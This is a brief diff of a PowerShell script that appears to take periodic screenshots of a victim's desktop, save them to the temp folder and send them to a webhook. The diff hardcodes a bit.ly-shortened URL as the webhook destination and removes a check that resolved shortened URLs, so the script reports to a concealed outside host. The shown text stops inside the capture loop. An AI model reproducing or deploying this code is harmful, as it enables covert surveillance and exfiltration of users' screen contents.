@@ -1,9 +1,6 @@
-$hookurl = "$dc"
+$hookurl = "https://bit.ly/web_chupakbras"
 $seconds = 30 # Screenshot interval
 $a = 1 # Sceenshot amount
-
-# shortened URL Detection
-if ($hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $hookurl = (irm $hookurl).url}
 
 While ($a -gt 0){
 $Filett = "$env:temp\SC.png"
